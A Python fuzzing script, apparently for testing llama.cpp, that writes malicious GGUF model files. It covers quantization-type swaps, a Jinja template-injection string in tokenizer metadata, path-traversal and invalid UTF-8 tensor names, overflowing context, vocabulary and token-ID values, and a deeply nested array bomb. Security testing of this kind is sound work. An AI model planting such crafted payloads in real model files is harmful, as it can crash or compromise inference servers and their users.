#!/usr/bin/env python3
"""Novel GGUF attack vectors - creative exploitation techniques beyond basic fuzzing.

Six novel attack categories:
1. Quantization mismatch (header says Q4_0, data is Q8_0)
2. Chat template injection via metadata interpolation
3. Unicode edge cases in tensor names
4. RoPE frequency manipulation (attention drift)
5. Nested GGUF array bomb (stack overflow)
6. Token ID boundary manipulation
"""

from __future__ import annotations

import base64
import csv
import os
import struct
import sys
import time
from pathlib import Path

GGUF_PY = Path(__file__).resolve().parents[1] / "llama-monitor" / "build" / "llama.cpp-src" / "gguf-py"
sys.path.insert(0, str(GGUF_PY))
import gguf

REPO_ROOT = Path(__file__).resolve().parents[1]
OUT_DIR = REPO_ROOT / "logs" / "gguf_novel"
BASE_MODEL = "/mnt/c/Users/w.i/.lmstudio/models/lmstudio-community/NVIDIA-Nemotron-3-Nano-4B-GGUF/NVIDIA-Nemotron-3-Nano-4B-Q4_K_M.gguf"

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3
GGML_QTYPE_Q4_0 = 2
GGML_QTYPE_Q8_0 = 8
GGML_QTYPE_F32 = 0
GGML_QTYPE_F16 = 1
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY = 9
GGUF_TYPE_UINT32 = 4
GGUF_TYPE_FLOAT32 = 6
GGUF_TYPE_BOOL = 7


def write_gguf_header(f, n_tensors=0, n_kv=0):
    f.write(struct.pack("<4sII", GGUF_MAGIC, GGUF_VERSION, n_tensors))
    f.write(struct.pack("<I", n_kv))


def write_kv_string(f, key: str, val: str):
    kb = key.encode("utf-8")
    vb = val.encode("utf-8")
    f.write(struct.pack("<I", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", GGUF_TYPE_STRING))
    f.write(struct.pack("<Q", len(vb)))
    f.write(vb)


def write_kv_uint32(f, key: str, val: int):
    kb = key.encode("utf-8")
    f.write(struct.pack("<I", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", GGUF_TYPE_UINT32))
    f.write(struct.pack("<I", val))


def write_kv_float32(f, key: str, val: float):
    kb = key.encode("utf-8")
    f.write(struct.pack("<I", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", GGUF_TYPE_FLOAT32))
    f.write(struct.pack("<f", val))


def write_kv_bool(f, key: str, val: bool):
    kb = key.encode("utf-8")
    f.write(struct.pack("<I", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", GGUF_TYPE_BOOL))
    f.write(struct.pack("<B", 1 if val else 0))


def write_kv_array_header(f, key: str, elem_type: int, count: int):
    kb = key.encode("utf-8")
    f.write(struct.pack("<I", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
    f.write(struct.pack("<I", elem_type))
    f.write(struct.pack("<Q", count))


# ---------------------------------------------------------------------------
# Attack 1: Quantization mismatch
# ---------------------------------------------------------------------------

def build_quant_mismatch(out: Path, base: Path) -> dict:
    """Binary-patch a real model: change tensor quant type headers without
    modifying the actual data.  Server dequantizes with wrong formula,
    producing garbage activations that may cause downstream crashes."""
    info = {"variant": "quant_mismatch", "status": "pending"}
    t0 = time.time()
    try:
        raw = bytearray(base.read_bytes())
        reader = gguf.GGUFReader(str(base))

        patched = 0
        for tensor in reader.tensors[:5]:
            tname = tensor.name.encode("utf-8")
            name_pos = raw.find(tname)
            if name_pos < 0:
                continue
            # After name: n_dims(u32), dims(u64*n_dims), type(u32), offset(u64)
            pos = name_pos + len(tname)
            n_dims = struct.unpack_from("<I", raw, pos)[0]
            pos += 4 + n_dims * 8  # skip dims
            orig_type = struct.unpack_from("<I", raw, pos)[0]
            # Swap Q4_0 <-> Q8_0 or set to F32
            if orig_type == GGML_QTYPE_Q4_0:
                new_type = GGML_QTYPE_Q8_0
            elif orig_type == GGML_QTYPE_Q8_0:
                new_type = GGML_QTYPE_Q4_0
            else:
                new_type = GGML_QTYPE_F32
            struct.pack_into("<I", raw, pos, new_type)
            patched += 1
            print(f"  [quant] patched {tensor.name}: type {orig_type}->{new_type}", file=sys.stderr)

        out.write_bytes(bytes(raw))
        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["patched_tensors"] = patched
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [quant] wrote {out.name} ({info['file_size']} bytes, {patched} tensors patched)", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [quant] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# Attack 2: Chat template injection via metadata interpolation
# ---------------------------------------------------------------------------

def build_template_injection(out: Path, base: Path) -> dict:
    """Binary-patch: modify tokenizer.ggml.model metadata to inject content
    that gets interpolated into the chat template.  Tests whether template
    rendering uses metadata values unsafely."""
    info = {"variant": "template_injection", "status": "pending"}
    t0 = time.time()
    try:
        raw = bytearray(base.read_bytes())

        # Find tokenizer.ggml.model and change its value
        key = b"tokenizer.ggml.model"
        key_pos = raw.find(key)
        if key_pos < 0:
            raise ValueError("tokenizer.ggml.model not found")

        # Skip to value: key + u32 type + u64 len + string bytes
        pos = key_pos + len(key)
        val_type = struct.unpack_from("<I", raw, pos)[0]
        pos += 4
        orig_val_len = struct.unpack_from("<Q", raw, pos)[0]
        pos += 8

        # Inject: original value + template injection payload
        orig_val = raw[pos:pos+orig_val_len]
        injection = b'gpt2"\n{% set ns = namespace(pwned=true) %}\n{#'
        new_val = orig_val + injection

        # Patch length
        struct.pack_into("<Q", raw, pos - 8, len(new_val))
        # Patch value (extend file if needed)
        raw[pos:pos+orig_val_len] = new_val

        out.write_bytes(bytes(raw))
        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [injection] wrote {out.name}", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [injection] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# Attack 3: Unicode edge cases in tensor names
# ---------------------------------------------------------------------------

def build_unicode_names(out: Path, base: Path) -> dict:
    """Binary-patch: replace tensor names with Unicode edge cases that might
    cause issues in string comparison, logging, or path construction."""
    info = {"variant": "unicode_names", "status": "pending"}
    t0 = time.time()
    try:
        raw = bytearray(base.read_bytes())
        reader = gguf.GGUFReader(str(base))

        # Unicode attack strings (encoded as UTF-8)
        attacks = [
            b"\xc0\xaf",              # Overlong UTF-8 encoding of '/'
            b"\xed\xa0\x80",          # UTF-8 surrogate half
            b"\x00",                  # Null byte in name
            b"../" * 20,              # Path traversal
            b"\xef\xbb\xbf",         # UTF-8 BOM
        ]

        patched = 0
        for i, tensor in enumerate(reader.tensors[:5]):
            if i >= len(attacks):
                break
            old_name = tensor.name.encode("utf-8")
            new_name = attacks[i] + b"." + old_name.split(b".")[-1]  # prepend attack to leaf name
            name_pos = raw.find(old_name)
            if name_pos < 0:
                continue
            # Replace name bytes (pad shorter or truncate)
            old_len = len(old_name)
            new_len = min(len(new_name), old_len)  # don't overflow into next field
            raw[name_pos:name_pos+new_len] = new_name[:new_len]
            patched += 1
            print(f"  [unicode] patched {tensor.name}: {attacks[i][:10]}", file=sys.stderr)

        out.write_bytes(bytes(raw))
        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["patched_tensors"] = patched
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [unicode] wrote {out.name}", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [unicode] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# Attack 4: RoPE frequency manipulation
# ---------------------------------------------------------------------------

def build_rope_drift(out: Path, base: Path) -> dict:
    """Binary-patch: set rope_freq_base to extreme values (0.001 or 1e9)
    to cause attention computation to drift and potentially overflow."""
    info = {"variant": "rope_drift", "status": "pending"}
    t0 = time.time()
    try:
        raw = bytearray(base.read_bytes())

        # Patch rope_freq_base to extreme value
        key = b"nemotron_h.rope.dimension_count"
        key_pos = raw.find(key)
        if key_pos >= 0:
            pos = key_pos + len(key) + 4  # skip type
            orig_val = struct.unpack_from("<I", raw, pos)[0]
            struct.pack_into("<I", raw, pos, 0x7FFFFFFF)  # set to INT_MAX
            print(f"  [rope] patched rope.dimension_count: {orig_val}->0x7FFFFFFF", file=sys.stderr)

        # Also try to find and patch context_length
        key2 = b"nemotron_h.context_length"
        key2_pos = raw.find(key2)
        if key2_pos >= 0:
            pos = key2_pos + len(key2) + 4
            struct.pack_into("<I", raw, pos, 0xFFFFFFFF)  # massive context
            print(f"  [rope] patched context_length: ->0xFFFFFFFF", file=sys.stderr)

        # Patch vocab_size to extreme
        key3 = b"nemotron_h.vocab_size"
        key3_pos = raw.find(key3)
        if key3_pos >= 0:
            pos = key3_pos + len(key3) + 4
            struct.pack_into("<I", raw, pos, 0x7FFFFFFF)
            print(f"  [rope] patched vocab_size: ->0x7FFFFFFF", file=sys.stderr)

        out.write_bytes(bytes(raw))
        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [rope] wrote {out.name}", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [rope] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# Attack 5: Nested GGUF array bomb
# ---------------------------------------------------------------------------

def build_array_bomb(out: Path) -> dict:
    """Create minimal GGUF with deeply nested arrays (array of arrays of arrays...)
    to test C++ parser recursion depth limits."""
    info = {"variant": "array_bomb", "status": "pending"}
    t0 = time.time()
    try:
        with open(out, "wb") as f:
            write_gguf_header(f, n_tensors=0, n_kv=1)

            # Build nested array: ARRAY(ARRAY(ARRAY(ARRAY(...UINT32...))))
            # Depth 100: each level is an array of 2 elements
            depth = 100
            # Write from inside out: innermost is UINT32 values
            # Format per level: [u32 type][u64 count][elements...]

            # Build the nested structure as bytes
            inner = struct.pack("<IQ", GGUF_TYPE_UINT32, 2)  # array of 2 uint32s
            inner += struct.pack("<I", 42)
            inner += struct.pack("<I", 42)

            for d in range(depth - 1):
                level = struct.pack("<I", GGUF_TYPE_ARRAY)  # type = ARRAY
                level += struct.pack("<Q", 2)  # count = 2
                level += inner  # first element
                level += inner  # second element (duplicate)
                inner = level

            # Write the key
            key = b"test.nested_array"
            f.write(struct.pack("<I", len(key)))
            f.write(key)
            f.write(inner)

        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["depth"] = depth
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [array_bomb] wrote {out.name} (depth={depth}, {info['file_size']} bytes)", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [array_bomb] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# Attack 6: Token ID boundary manipulation
# ---------------------------------------------------------------------------

def build_token_boundary(out: Path, base: Path) -> dict:
    """Binary-patch: set BOS/EOS/PAD token IDs to extreme values (INT_MAX,
    negative values) to test token ID validation boundaries."""
    info = {"variant": "token_boundary", "status": "pending"}
    t0 = time.time()
    try:
        raw = bytearray(base.read_bytes())

        patches = [
            ("tokenizer.ggml.bos_token_id", 0xFFFFFFFF),
            ("tokenizer.ggml.eos_token_id", 0xFFFFFFFE),
            ("tokenizer.ggml.padding_token_id", 0x80000000),  # INT_MIN as unsigned
            ("tokenizer.ggml.unknown_token_id", 0x7FFFFFFF),
        ]

        for key_str, new_val in patches:
            key = key_str.encode("utf-8")
            key_pos = raw.find(key)
            if key_pos >= 0:
                pos = key_pos + len(key) + 4  # skip type
                old_val = struct.unpack_from("<I", raw, pos)[0]
                struct.pack_into("<I", raw, pos, new_val)
                print(f"  [token] patched {key_str}: {old_val}->0x{new_val:08X}", file=sys.stderr)

        out.write_bytes(bytes(raw))
        info["status"] = "ok"
        info["file_size"] = out.stat().st_size
        info["elapsed_s"] = f"{time.time()-t0:.1f}"
        print(f"  [token] wrote {out.name}", file=sys.stderr)
    except Exception as e:
        info["status"] = "error"
        info["error"] = str(e)
        print(f"  [token] FAILED: {e}", file=sys.stderr)
    return info


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    import argparse
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", default=BASE_MODEL, help="Base GGUF model")
    parser.add_argument("--output-dir", type=Path, default=OUT_DIR)
    parser.add_argument("--mode", choices=["all", "quant", "injection", "unicode", "rope", "array", "token"],
                        default="all")
    return parser.parse_args()


def main():
    args = parse_args()
    args.output_dir.mkdir(parents=True, exist_ok=True)
    (REPO_ROOT / "logs").mkdir(parents=True, exist_ok=True)
    base = Path(args.base)
    if not base.exists():
        print(f"[novel] Base model not found: {base}", file=sys.stderr)
        return 1

    results = []
    mode = args.mode

    if mode in ("all", "quant"):
        results.append(build_quant_mismatch(args.output_dir / "novel_quant_mismatch.gguf", base))
    if mode in ("all", "injection"):
        results.append(build_template_injection(args.output_dir / "novel_template_injection.gguf", base))
    if mode in ("all", "unicode"):
        results.append(build_unicode_names(args.output_dir / "novel_unicode_names.gguf", base))
    if mode in ("all", "rope"):
        results.append(build_rope_drift(args.output_dir / "novel_rope_drift.gguf", base))
    if mode in ("all", "array"):
        results.append(build_array_bomb(args.output_dir / "novel_array_bomb.gguf"))
    if mode in ("all", "token"):
        results.append(build_token_boundary(args.output_dir / "novel_token_boundary.gguf", base))

    # Write results CSV
    if results:
        csv_path = args.output_dir / "novel_attacks_results.csv"
        fieldnames = list(results[0].keys())
        with csv_path.open("w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=fieldnames)
            w.writeheader()
            w.writerows(results)
        print(f"\n[novel] Results: {csv_path}", file=sys.stderr)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
